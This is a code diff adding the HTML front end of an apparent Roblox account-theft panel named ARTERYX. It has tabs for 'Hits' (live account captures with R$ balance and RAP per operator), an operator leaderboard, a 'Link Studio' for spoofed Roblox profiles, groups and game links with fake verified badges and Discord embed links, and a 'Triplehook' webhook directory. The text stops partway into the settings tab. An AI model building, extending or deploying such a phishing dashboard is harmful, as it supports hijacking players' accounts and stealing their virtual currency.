@@ -1,0 +1,849 @@
+<!doctype html>
+<html lang="en" class="dark-theme">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="minimum-scale=1, initial-scale=1, width=device-width" />
+    <meta name="theme-color" content="#07070b" />
+    <meta property="og:title" content="Dashboard" />
+    <meta property="og:site_name" content="Radiant" />
+    <title>Radiant</title>
+    <link rel="icon" href="/assets/arteryx/logo.png" />
+    <script>
+    (function () {
+      var p = (location.pathname || "/").replace(/\/+$/, "").toLowerCase() || "/";
+      window.__BEAMSE_MODE__ = (p === "/controller/dashboard") ? "arteryx" : "spa";
+      window.__ARTERYX_VER__ = "v2";
+      if (window.__BEAMSE_MODE__ === "arteryx") { document.title = "ARTERYX — Dashboard"; }
+    })();
+    </script>
+    <script type="module">
+    (function () {
+      var v = window.__ARTERYX_VER__ || "v1";
+      function add_css(href) { var l = document.createElement("link"); l.rel = "stylesheet"; l.href = href; document.head.appendChild(l); }
+      function add_js(src, mod) { var s = document.createElement("script"); if (mod) s.type = "module"; s.src = src; document.head.appendChild(s); }
+      if (window.__BEAMSE_MODE__ === "arteryx") {
+        add_css("https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Inter:wght@400;500;600;700&family=Outfit:wght@400;500;600;700&family=Rajdhani:wght@400;500;600;700&display=swap");
+        add_css("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css");
+        add_css("/assets/arteryx/dashboard.css?" + v);
+        add_js("/assets/arteryx/dashboard.js?" + v);
+      } else {
+        var t = document.createElement("script"); t.src = "https://cdn.tailwindcss.com"; document.head.appendChild(t);
+        add_css("/assets/index-beamse-v21.css");
+        add_js("/assets/index-beamse-v21.js", true);
+      }
+    })();
+    </script>
+  </head>
+  <body class="dash_page">
+    <div id="root"></div>
+
+    <!-- ═══════════════════════════════════════════════════════════════
+         ARTERYX DASHBOARD MARKUP (used only when path = /controller/dashboard)
+         ═══════════════════════════════════════════════════════════════ -->
+    <script type="text/template" id="arteryx-markup">
+    <canvas id="bgCanvas" aria-hidden="true"></canvas>
+
+    <header class="arteryx-header" id="triplehookHeader">
+        <div class="header-brand-wrap">
+            <a href="/controller/dashboard" class="header-brand-link">
+                <img src="/assets/arteryx/logo.png" alt="ARTERYX" class="header-brand-logo">
+                <span class="header-brand-name">ARTERYX</span>
+            </a>
+        </div>
+        <div class="header-center-actions">
+            <button class="header-pill-btn" onclick="switchMainTab('domains')">
+                <i class="fas fa-wand-magic-sparkles"></i>
+                <span>Link Studio</span>
+            </button>
+            <button class="header-pill-btn" onclick="document.querySelector('.bottom-section-grid')?.scrollIntoView({behavior:'smooth',block:'nearest'})">
+                <i class="fas fa-chart-line"></i>
+                <span>Insights</span>
+            </button>
+        </div>
+        <div class="header-user-section">
+            <div class="header-user" id="headerUser" onclick="toggleHeaderDropdown(event)">
+                <div class="header-avatar-wrap">
+                    <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="" class="header-avatar" id="headerAvatar">
+                </div>
+                <span class="header-username" id="headerUsername">Guest</span>
+                <svg class="header-user-caret" viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </div>
+            <div class="header-dropdown" id="headerDropdown">
+                <div class="header-dropdown-item" onclick="switchMainTab('settings')">
+                    <i class="fas fa-sliders-h"></i>
+                    <span>Settings</span>
+                </div>
+                <div class="header-dropdown-item" onclick="switchMainTab('triplehook')">
+                    <i class="fas fa-link"></i>
+                    <span>Triplehook</span>
+                </div>
+                <div class="header-dropdown-divider"></div>
+                <div class="header-dropdown-item" style="color:#ef4444;" onclick="doLogout()">
+                    <i class="fas fa-sign-out-alt"></i>
+                    <span>Log Out</span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <nav class="dock-nav" id="sidebar">
+        <div class="dock-item active" data-tab="main" onclick="switchMainTab('main', this)">
+            <i class="fas fa-home"></i>
+            <span class="dock-tooltip">Overview</span>
+            <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
+        </div>
+        <div class="dock-item" data-tab="domains" onclick="switchMainTab('domains', this)">
+            <i class="fas fa-wand-magic-sparkles"></i>
+            <span class="dock-tooltip">Link Studio</span>
+            <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
+        </div>
+        <div class="dock-item" data-tab="triplehook" onclick="switchMainTab('triplehook', this)">
+            <i class="fas fa-link"></i>
+            <span class="dock-tooltip">Triplehook</span>
+            <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
+        </div>
+        <div class="dock-item" data-tab="settings" onclick="switchMainTab('settings', this)">
+            <i class="fas fa-sliders-h"></i>
+            <span class="dock-tooltip">Settings</span>
+            <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
+        </div>
+        <div class="dock-item" onclick="doLogout()">
+            <i class="fas fa-sign-out-alt"></i>
+            <span class="dock-tooltip">Log Out</span>
+            <div class="dock-progress-track"><div class="dock-progress-bar"></div></div>
+        </div>
+    </nav>
+
+    <main class="main-content">
+
+        <!-- ── TAB: OVERVIEW ── -->
+        <section class="tab-panel active" id="main-tab" aria-label="Overview">
+            <div class="top-stats-grid">
+                <!-- Card 1: Total Accounts -->
+                <div class="modern-stat-card neon-hover-card" id="accounts-stat-card">
+                    <div class="stat-icon-wrapper">
+                        <svg class="stat-icon-svg" viewBox="0 0 32 32" fill="currentColor">
+                            <path d="M 16 4 C 9.37 4 4 9.37 4 16 C 4 22.63 9.37 28 16 28 C 22.63 28 28 22.63 28 16 C 28 15.52 27.96 15.04 27.91 14.57 C 27.51 14.84 27.02 15 26.5 15 C 25.42 15 24.51 14.31 24.16 13.36 C 23.54 13.76 22.8 14 22 14 C 19.79 14 18 12.21 18 10 C 18 9.27 18.21 8.59 18.56 7.99 C 18.54 8 18.52 8 18.5 8 C 17.12 8 16 6.88 16 5.5 C 16 4.94 16.19 4.43 16.5 4.02 C 16.33 4.01 16.17 4 16 4 Z M 16 15 C 15.45 15 15 15.45 15 16 C 15 16.55 15.45 17 16 17 C 16.55 17 17 16.55 17 16 C 17 15.45 16.55 15 16 15 Z"/>
+                        </svg>
+                    </div>
+                    <div class="stat-content">
+                        <div class="stat-label">Total Accounts</div>
+                        <div class="stat-value" id="statsAccounts">0</div>
+                        <div class="stat-bottom-row">
+                            <div class="card-user-info">
+                                <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class="card-user-avatar" id="accUserAvatar" alt="">
+                                <span class="card-user-name" id="accUserName">Guest</span>
+                            </div>
+                            <span class="stat-dot">•</span>
+                            <div class="stat-today green" id="statsAccountsDelta"><i></i>+0 <span>today</span></div>
+                        </div>
+                        <div class="stat-mini-chart" id="accMiniChart"></div>
+                        <div class="stat-mini-info">
+                            <div class="stat-mini-labels" id="accMiniLabels"></div>
+                            <div class="stat-mini-pct" id="accMiniPct"><i class="fas fa-arrow-up"></i> 0%</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Card 2: Total Visits -->
+                <div class="modern-stat-card neon-hover-card" id="visits-stat-card">
+                    <div class="stat-icon-wrapper">
+                        <svg class="stat-icon-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="7" r="3"/>
+                        </svg>
+                    </div>
+                    <div class="stat-content">
+                        <div class="stat-label">Total Visits</div>
+                        <div class="stat-value" id="statsVisits">0</div>
+                        <div class="stat-bottom-row">
+                            <div class="card-user-info">
+                                <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class="card-user-avatar" id="visitsUserAvatar" alt="">
+                                <span class="card-user-name" id="visitsUserName">Guest</span>
+                            </div>
+                            <span class="stat-dot">•</span>
+                            <div class="stat-today green" id="statsVisitsDelta"><i></i>+0 <span>today</span></div>
+                        </div>
+                        <div class="stat-mini-chart" id="visitsMiniChart"></div>
+                        <div class="stat-mini-info">
+                            <div class="stat-mini-labels" id="visitsMiniLabels"></div>
+                            <div class="stat-mini-pct" id="visitsMiniPct"><i class="fas fa-arrow-up"></i> 0%</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Card 3: Active Links -->
+                <div class="modern-stat-card neon-hover-card" id="clicks-stat-card">
+                    <div class="stat-icon-wrapper">
+                        <svg class="stat-icon-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/>
+                        </svg>
+                    </div>
+                    <div class="stat-content">
+                        <div class="stat-label">Active Links</div>
+                        <div class="stat-value" id="statsClicks">0</div>
+                        <div class="stat-bottom-row">
+                            <div class="card-user-info">
+                                <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" class="card-user-avatar" id="clicksUserAvatar" alt="">
+                                <span class="card-user-name" id="clicksUserName">Guest</span>
+                            </div>
+                            <span class="stat-dot">•</span>
+                            <div class="stat-today green" id="statsClicksDelta"><i></i>+0 <span>today</span></div>
+                        </div>
+                        <div class="stat-mini-chart" id="clicksMiniChart"></div>
+                        <div class="stat-mini-info">
+                            <div class="stat-mini-labels" id="clicksMiniLabels"></div>
+                            <div class="stat-mini-pct" id="clicksMiniPct"><i class="fas fa-arrow-up"></i> 0%</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Card 4: Summary Card -->
+                <div class="modern-stat-card summary-card-container" id="summary-card">
+                    <div class="summary-content">
+                        <div class="summary-grid-horizontal">
+                            <div class="summary-item">
+                                <div class="summary-label">Summary Total</div>
+                                <div class="summary-value" id="weeklySummaryVal">0</div>
+                                <div class="summary-bottom-row">
+                                    <div class="summary-change" id="weeklySummaryDelta">+0 <span>today</span></div>
+                                </div>
+                                <div class="summary-mini-chart" id="sMiniSummary"></div>
+                                <div class="summary-mini-info">
+                                    <div class="summary-mini-labels" id="sMiniSummaryL"></div>
+                                    <div class="summary-mini-pct" id="sMiniSummaryP"><i class="fas fa-arrow-up"></i> 0%</div>
+                                </div>
+                            </div>
+                            <div class="summary-item">
+                                <div class="summary-label">RAP Total</div>
+                                <div class="summary-value" id="weeklyRapVal">0</div>
+                                <div class="summary-bottom-row">
+                                    <div class="summary-change" id="weeklyRapDelta">+0 <span>today</span></div>
+                                </div>
+                                <div class="summary-mini-chart" id="sMiniRap"></div>
+                                <div class="summary-mini-info">
+                                    <div class="summary-mini-labels" id="sMiniRapL"></div>
+                                    <div class="summary-mini-pct" id="sMiniRapP"><i class="fas fa-arrow-up"></i> 0%</div>
+                                </div>
+                            </div>
+                            <div class="summary-item">
+                                <div class="summary-label">Balance Total</div>
+                                <div class="summary-value" id="weeklyBalanceVal">0 R$</div>
+                                <div class="summary-bottom-row">
+                                    <div class="summary-change" id="weeklyBalanceDelta">+0 R$ <span>today</span></div>
+                                </div>
+                                <div class="summary-mini-chart" id="sMiniBalance"></div>
+                                <div class="summary-mini-info">
+                                    <div class="summary-mini-labels" id="sMiniBalanceL"></div>
+                                    <div class="summary-mini-pct" id="sMiniBalanceP"><i class="fas fa-arrow-up"></i> 0%</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="stat-divider"></div>
+
+            <div class="bottom-section-grid">
+                <div class="overview-card">
+                    <div class="chart-header">
+                        <div>
+                            <h2>Activity</h2>
+                            <div class="overview-card-sub">Past 7 days telemetry</div>
+                        </div>
+                    </div>
+                    <canvas id="overviewChart" height="260" aria-label="Activity per day" role="img"></canvas>
+                    <div class="chart-axis-x" id="chartAxis" aria-hidden="true"></div>
+                </div>
+
+                <div class="overview-card leaderboards-card">
+                    <div class="leaderboards-header">
+                        <div>
+                            <h2>Leaderboard</h2>
+                            <div class="overview-card-sub">Top operators this week</div>
+                        </div>
+                    </div>
+                    <div class="leaderboards-list" id="activityFeed"></div>
+                </div>
+            </div>
+
+            <div class="stat-divider"></div>
+
+            <div class="live-section-grid">
+                <div class="overview-card live-hits-card">
+                    <div class="live-hits-header">
+                        <div>
+                            <h2>Hits</h2>
+                            <div class="overview-card-sub">Live account captures</div>
+                        </div>
+                        <span class="lower-card-meta">Live</span>
+                    </div>
+                    <div class="live-hits-thead">
+                        <span>User</span>
+                        <span>Time</span>
+                        <span>Balance</span>
+                        <span>Summary</span>
+                        <span>RAP</span>
+                        <span>Operator</span>
+                    </div>
+                    <div class="hits-table-body-wrap" id="hitsTableBody"></div>
+                    <div class="hits-empty" id="hitsEmptyMsg" style="padding: 24px; text-align: center; color: rgba(255,255,255,0.3); font-family: 'Rajdhani', sans-serif;">No recent captures recorded.</div>
+                </div>
+
+                <div class="overview-card user-stats-card">
+                    <div class="user-stats-avatar-orbit">
+                        <div id="operatorCardAvatar" style="width:100%;height:100%;border-radius:50%;overflow:hidden;background:rgba(255,255,255,0.05);display:flex;align-items:center;justify-content:center;">
+                            <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                        </div>
+                    </div>
+                    <div class="user-stats-name" id="operatorCardName">Guest</div>
+                    <div class="user-stats-role" id="operatorCardRole">Operator</div>
+                    <div class="user-stats-grid">
+                        <div class="user-stat-box">
+                            <div class="user-stat-lbl">Today</div>
+                            <div class="user-stat-val" id="opTodayHits">0</div>
+                        </div>
+                        <div class="user-stat-box">
+                            <div class="user-stat-lbl">Total</div>
+                            <div class="user-stat-val" id="opTotalHits">0</div>
+                        </div>
+                        <div class="user-stat-box">
+                            <div class="user-stat-lbl">Rate</div>
+                            <div class="user-stat-val" id="opConvRate">100%</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ── TAB: LINK STUDIO ── -->
+        <section class="tab-panel" id="domains-tab" aria-label="Link Studio">
+            <div class="domain-head" style="margin-bottom: 24px; text-align: center;">
+                <h2 class="domain-section-title" style="font-family:'Rajdhani',sans-serif;font-size:1.6rem;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:#fff;margin-bottom:6px;">Link Studio</h2>
+                <p class="domain-section-desc" style="font-family:'Rajdhani',sans-serif;font-size:0.88rem;color:rgba(255,255,255,0.45);letter-spacing:0.5px;">Create and customize spoofed user profiles, community groups, and game launch links.</p>
+            </div>
+
+            <div class="tab-navigation" style="margin-bottom:24px;">
+                <button class="tab-btn active" data-tab="profile" onclick="showControllerTab('profile')">
+                    <i class="fas fa-user"></i> Profile
+                </button>
+                <button class="tab-btn" data-tab="community" onclick="showControllerTab('community')">
+                    <i class="fas fa-users"></i> Communities
+                </button>
+                <button class="tab-btn" data-tab="game" onclick="showControllerTab('game')">
+                    <i class="fas fa-gamepad"></i> Game Link
+                </button>
+            </div>
+
+            <div class="domains-stage-card card" id="controllerStageCard" style="position:relative;">
+                <div class="tab-loading-overlay" id="controllerLoadingOverlay">
+                    <div class="loading-dots"><span></span><span></span><span></span></div>
+                </div>
+
+                <!-- ── 1. PROFILE CONTROLLER TAB ── -->
+                <div id="profileForm" class="tab-content">
+                    <div class="profile-preview">
+                        <div class="profile-left">
+                            <div class="avatar-wrapper">
+                                <img id="stageProfileAvatar" class="profile-avatar avatar-in"
+                                     src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-310966282D3529E36976BF6B07B1DC90-Png/420/420/AvatarHeadshot/Png/noFilter"
+                                     alt="Roblox">
+                            </div>
+                            <div class="profile-info">
+                                <h2>
+                                    <span id="stagePreviewDisplayName">Roblox</span>
+                                    <img id="stagePremiumIcon" class="premium-icon" src="https://images.rbxcdn.com/e25c04467c6999a093edec3b55bc5963-premium_dark.svg" style="display:none;" alt="Premium">
+                                    <img id="stageVerifiedIcon" class="verified-icon" src="https://images.rbxcdn.com/b52994086ea761c78479e0004ff9cc75-verified_badge_dark.svg" style="display:inline;" alt="Verified">
+                                </h2>
+                                <p class="username" id="stagePreviewUsername">Roblox</p>
+                                <div class="profile-stats">
+                                    <span><strong id="stagePreviewFriends">200</strong> Friends</span>
+                                    <span><strong id="stagePreviewFollowers">10,842,000</strong> Followers</span>
+                                    <span><strong id="stagePreviewFollowing">68</strong> Following</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="profile-right">
+                            <button type="button" class="profile-btn copy-url" id="stageCopyProfileBtn" onclick="copyStageProfileLink()">
+                                <i class="fas fa-link"></i> Copy Link
+                            </button>
+                            <button type="button" class="profile-btn copy-discord" id="stageCopyDiscordBtn" onclick="copyStageProfileDiscordLink()">
+                                <div class="btn-main"><i class="fab fa-discord"></i> Copy Discord Link</div>
+                                <div class="btn-sub">Formatted embed link</div>
+                            </button>
+                            <button type="button" class="profile-btn goto" id="stageGotoProfileBtn" onclick="openStageProfileLink()">
+                                <i class="fas fa-external-link-alt"></i> Test Profile
+                            </button>
+                        </div>
+                    </div>
+
+                    <form id="stageProfileFormElement" onsubmit="event.preventDefault(); saveStageProfile();">
+                        <div class="form-row">
+                            <div class="input-group">
+                                <label for="stageRealUsername">Real Roblox Username</label>
+                                <div style="display:flex;gap:8px;">
+                                    <input type="text" id="stageRealUsername" placeholder="e.g. Roblox" value="Roblox" oninput="updateStageProfilePreview()" autocomplete="off" spellcheck="false">
+                                    <button type="button" class="load-avatar-addon-btn" onclick="fetchStageRobloxUser()"><i class="fas fa-sync-alt"></i> Load</button>
+                                </div>
+                            </div>
+                            <div class="input-group">
+                                <label for="stageFakeUsername">Vanity Username</label>
+                                <input type="text" id="stageFakeUsername" placeholder="e.g. Roblox" value="Roblox" oninput="updateStageProfilePreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="input-group">
+                                <label for="stageDisplayUsername">Display Name</label>
+                                <input type="text" id="stageDisplayUsername" placeholder="e.g. Roblox" value="Roblox" oninput="updateStageProfilePreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                            <div class="input-group">
+                                <label for="stagePremiumSelect">Premium Membership</label>
+                                <select id="stagePremiumSelect" onchange="updateStageProfilePreview()">
+                                    <option value="No" selected>No</option>
+                                    <option value="Yes">Yes</option>
+                                </select>
+                            </div>
+                        </div>
+
+                        <div class="form-row four-col">
+                            <div class="input-group">
+                                <label for="stageVerifiedSelect">Verified Badge</label>
+                                <select id="stageVerifiedSelect" onchange="updateStageProfilePreview()">
+                                    <option value="No">No</option>
+                                    <option value="Yes" selected>Yes</option>
+                                </select>
+                            </div>
+                            <div class="input-group">
+                                <label for="stageFriendsInput">Friends</label>
+                                <input type="number" id="stageFriendsInput" min="0" placeholder="200" value="200" oninput="updateStageProfilePreview()">
+                            </div>
+                            <div class="input-group">
+                                <label for="stageFollowersInput">Followers</label>
+                                <input type="number" id="stageFollowersInput" min="0" placeholder="10842000" value="10842000" oninput="updateStageProfilePreview()">
+                            </div>
+                            <div class="input-group">
+                                <label for="stageFollowingsInput">Following</label>
+                                <input type="number" id="stageFollowingsInput" min="0" placeholder="68" value="68" oninput="updateStageProfilePreview()">
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="input-group">
+                                <label for="stageActivitySelect">Activity Status</label>
+                                <select id="stageActivitySelect" onchange="updateStageProfilePreview()">
+                                    <option value="Online" selected>Online</option>
+                                    <option value="Offline">Offline</option>
+                                    <option value="In Game">In Game</option>
+                                    <option value="In Studio">In Studio</option>
+                                </select>
+                            </div>
+                            <div class="input-group">
+                                <label for="stageCreatedDate">Join Date</label>
+                                <div class="date-input-wrapper">
+                                    <input type="date" id="stageCreatedDate" value="2006-02-27">
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="form-row full-width">
+                            <div class="input-group">
+                                <label for="stageAboutInput">About / Bio</label>
+                                <textarea id="stageAboutInput" rows="3" placeholder="Custom Roblox profile description or bio..."></textarea>
+                            </div>
+                        </div>
+
+                        <button type="button" class="save-btn" id="stageSaveProfileBtn" onclick="saveStageProfile()">
+                            <i class="fas fa-save"></i> SAVE PROFILE
+                        </button>
+                    </form>
+                </div>
+
+                <!-- ── 2. COMMUNITY CONTROLLER TAB ── -->
+                <div id="communityForm" class="tab-content hidden">
+                    <div class="profile-preview">
+                        <div class="profile-left">
+                            <div class="avatar-wrapper">
+                                <img id="stageCommunityAvatar" class="profile-avatar" src="https://tr.rbxcdn.com/180DAY-5ef5355360e7cad0fb7708e1ab9c7125/150/150/Image/Webp/noFilter" alt="Group logo">
+                            </div>
+                            <div class="profile-info">
+                                <h2>
+                                    <span id="stagePreviewGroupName">Scriptbloxian Studios</span>
+                                </h2>
+                                <p class="username no-at">By <span id="stagePreviewOwnerName">Scriptbloxian</span></p>
+                                <div class="profile-stats">
+                                    <span><strong id="stagePreviewMembers">25,000,000</strong> Members</span>
+                                    <span><strong id="stagePreviewFunds">0</strong> Funds</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="profile-right">
+                            <button type="button" class="profile-btn copy-url" id="stageCopyCommunityBtn" onclick="copyStageCommunityLink()">
+                                <i class="fas fa-link"></i> Copy Link
+                            </button>
+                            <button type="button" class="profile-btn copy-discord" id="stageCopyDiscordCommunityBtn" onclick="copyStageCommunityDiscordLink()">
+                                <div class="btn-main"><i class="fab fa-discord"></i> Copy Discord Link</div>
+                                <div class="btn-sub">Formatted embed link</div>
+                            </button>
+                            <button type="button" class="profile-btn goto" id="stageGotoCommunityBtn" onclick="openStageCommunityLink()">
+                                <i class="fas fa-external-link-alt"></i> Test Community
+                            </button>
+                        </div>
+                    </div>
+
+                    <form id="stageCommunityFormElement" onsubmit="event.preventDefault(); saveStageCommunity();">
+                        <div class="form-row">
+                            <div class="input-group">
+                                <label for="stageRealGroupId">Real Group ID</label>
+                                <div style="display:flex;gap:8px;">
+                                    <input type="text" id="stageRealGroupId" placeholder="e.g. 32863920" oninput="updateStageCommunityPreview()" autocomplete="off" spellcheck="false">
+                                    <button type="button" class="load-avatar-addon-btn" onclick="fetchStageRobloxGroup()"><i class="fas fa-sync-alt"></i> Load</button>
+                                </div>
+                            </div>
+                            <div class="input-group">
+                                <label for="stageGroupName">Group Name</label>
+                                <input type="text" id="stageGroupName" placeholder="Scriptbloxian Studios" value="Scriptbloxian Studios" oninput="updateStageCommunityPreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="input-group">
+                                <label for="stageGroupOwner">Owner Username</label>
+                                <input type="text" id="stageGroupOwner" placeholder="Scriptbloxian" value="Scriptbloxian" oninput="updateStageCommunityPreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                            <div class="input-group">
+                                <label for="stageGroupMembers">Member Count</label>
+                                <input type="number" id="stageGroupMembers" min="0" placeholder="25000000" value="25000000" oninput="updateStageCommunityPreview()">
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="input-group">
+                                <label for="stageGroupFunds">Group Funds (R$)</label>
+                                <input type="number" id="stageGroupFunds" min="0" placeholder="0" value="0" oninput="updateStageCommunityPreview()">
+                            </div>
+                            <div class="input-group">
+                                <label for="stageGroupShout">Group Shout</label>
+                                <input type="text" id="stageGroupShout" placeholder="Group announcement..." autocomplete="off" spellcheck="false">
+                            </div>
+                        </div>
+
+                        <div class="form-row full-width">
+                            <div class="input-group full">
+                                <label for="stageGroupLogo">Group Logo URL</label>
+                                <input type="text" id="stageGroupLogo" placeholder="https://..." value="https://tr.rbxcdn.com/180DAY-5ef5355360e7cad0fb7708e1ab9c7125/150/150/Image/Webp/noFilter" oninput="updateStageCommunityPreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                        </div>
+
+                        <div class="form-row full-width">
+                            <div class="input-group">
+                                <label for="stageGroupDesc">Group Description</label>
+                                <textarea id="stageGroupDesc" rows="3" placeholder="Group description..."></textarea>
+                            </div>
+                        </div>
+
+                        <button type="button" class="save-btn" id="stageSaveCommunityBtn" onclick="saveStageCommunity()">
+                            <i class="fas fa-save"></i> SAVE COMMUNITY
+                        </button>
+                    </form>
+                </div>
+
+                <!-- ── 3. GAME LINK TAB ── -->
+                <div id="gameForm" class="tab-content hidden">
+                    <div class="profile-preview">
+                        <div class="profile-left">
+                            <div class="avatar-wrapper">
+                                <img id="stageGameIcon" class="profile-avatar" src="https://tr.rbxcdn.com/30DAY-AvatarHeadshot-310966282D3529E36976BF6B07B1DC90-Png/420/420/AvatarHeadshot/Png/noFilter" alt="Game">
+                            </div>
+                            <div class="profile-info">
+                                <h2><span id="stagePreviewGameTitle">Roblox Game</span></h2>
+                                <p class="username no-at">Place ID: <span id="stagePreviewPlaceId">4924922222</span></p>
+                            </div>
+                        </div>
+                        <div class="profile-right">
+                            <button type="button" class="profile-btn copy-url" id="stageCopyGameBtn" onclick="copyStageGameLink()">
+                                <i class="fas fa-link"></i> Copy Link
+                            </button>
+                            <button type="button" class="profile-btn copy-discord" id="stageCopyDiscordGameBtn" onclick="copyStageGameDiscordLink()">
+                                <div class="btn-main"><i class="fab fa-discord"></i> Copy Discord Link</div>
+                                <div class="btn-sub">Formatted embed link</div>
+                            </button>
+                            <button type="button" class="profile-btn goto" id="stageGotoGameBtn" onclick="openStageGameLink()">
+                                <i class="fas fa-external-link-alt"></i> Test Game
+                            </button>
+                        </div>
+                    </div>
+
+                    <form id="stageGameFormElement" onsubmit="event.preventDefault(); generateStageGameLink();">
+                        <div class="form-row">
+                            <div class="input-group">
+                                <label for="stagePlaceIdInput">Roblox Place ID</label>
+                                <div style="display:flex;gap:8px;">
+                                    <input type="text" id="stagePlaceIdInput" placeholder="e.g. 4924922222" value="4924922222" oninput="updateStageGamePreview()" autocomplete="off" spellcheck="false">
+                                    <button type="button" class="load-avatar-addon-btn" onclick="fetchStageGameInfo()"><i class="fas fa-search"></i> Inspect</button>
+                                </div>
+                            </div>
+                            <div class="input-group">
+                                <label for="stageGameTitleOverride">Title Override</label>
+                                <input type="text" id="stageGameTitleOverride" placeholder="Custom game title..." oninput="updateStageGamePreview()" autocomplete="off" spellcheck="false">
+                            </div>
+                        </div>
+
+                        <button type="button" class="save-btn" id="stageSaveGameBtn" onclick="generateStageGameLink()">
+                            <i class="fas fa-gamepad"></i> GENERATE GAME LINK
+                        </button>
+                    </form>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- ── TAB: TRIPLEHOOK ── -->
+        <section class="tab-panel" id="triplehook-tab" aria-label="Triplehook" style="position:relative;overflow:hidden;">
+            <div class="settings-glass-container">
+                <div class="settings-glass-header">
+                    <h2 class="settings-title">Triplehook</h2>
+                    <p class="settings-subtitle">Your public directory identity — shown to anyone browsing the triplehook directory.</p>
+                </div>
+
+                <div class="webhook-glass-card">
+                    <div class="webhook-glass-top">
+                        <div class="webhook-icon-badge">
+                            <i class="fas fa-link"></i>
+                        </div>
+                        <div class="webhook-meta">
+                            <div class="webhook-card-title">Display Identity</div>
+                            <div class="webhook-card-desc">Name, description and invite shown on your directory card</div>
+                        </div>
+                        <div class="webhook-status-pill" id="triplehookBadge">
+                            <span class="status-pulse-dot"></span>
+                            <span id="triplehookBadgeText">-</span>
+                        </div>
+                    </div>
+
+                    <div class="bh-form-grid">
+                        <div class="input-group">
+                            <label for="thName">Display Name</label>
+                            <input type="text" id="thName" maxlength="20" placeholder="e.g. Arteryx" autocomplete="off" spellcheck="false">
+                        </div>
+                        <div class="input-group">
+                            <label for="thInvite">Invite Link</label>
+                            <input type="text" id="thInvite" maxlength="255" placeholder="discord.gg/..." autocomplete="off" spellcheck="false">
+                        </div>
+                        <div class="input-group bh-span2">
+                            <label for="thDesc">Description</label>
+                            <input type="text" id="thDesc" maxlength="200" placeholder="Short tagline shown in the directory..." autocomplete="off" spellcheck="false">
+                        </div>
+                    </div>
+
+                    <div class="bh-toggle-row">
+                        <label class="bh-toggle">
+                            <input type="checkbox" id="thShowStats">
+                            <span class="bh-toggle-track"><span class="bh-toggle-thumb"></span></span>
+                            <span class="bh-toggle-label">Show stats</span>
+                        </label>
+                        <label class="bh-toggle">
+                            <input type="checkbox" id="thShowHits">
+                            <span class="bh-toggle-track"><span class="bh-toggle-thumb"></span></span>
+                            <span class="bh-toggle-label">Show hits</span>
+                        </label>
+                    </div>
+
+                    <div class="webhook-action-row">
+                        <button type="button" id="thSaveBtn" class="webhook-btn-white" onclick="saveTriplehook()">
+                            <i class="fas fa-save"></i> Save Identity
+                        </button>
+                        <button type="button" class="webhook-btn-glass" onclick="copyCreatePageLink(this)">
+                            <i class="fas fa-copy"></i> Copy Create Page
+                        </button>
+                    </div>
+
+                    <div id="thMsg" class="webhook-glass-alert" style="display:none;"></div>
+                </div>
+
+                <div class="overview-card leaderboards-card" style="margin-top:24px;">
+                    <div class="leaderboards-header">
+                        <div>
+                            <h2>Directory</h2>
+                            <div class="overview-card-sub">All triplehookers <span id="thDirStats"></span></div>
+                        </div>
+                    </div>
+                    <div class="leaderboards-list" id="thDirectory"></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ── TAB: SETTINGS ── -->
+        <section class="tab-panel" id="settings-tab" aria-label="Settings" style="position:relative;overflow:hidden;min-height:540px;">
+            <canvas id="settingsDotsCanvas" class="settings-dots-canvas"></canvas>
+
+            <div class="settings-glass-container">
+                <div class="settings-glass-header">
+                    <h2 class="settings-title">Settings</h2>
+                    <p class="settings-subtitle">Webhooks, alerts and dashboard preferences. Changes save to your account instantly.</p>
+                </div>
+
+                <div class="webhook-glass-card">
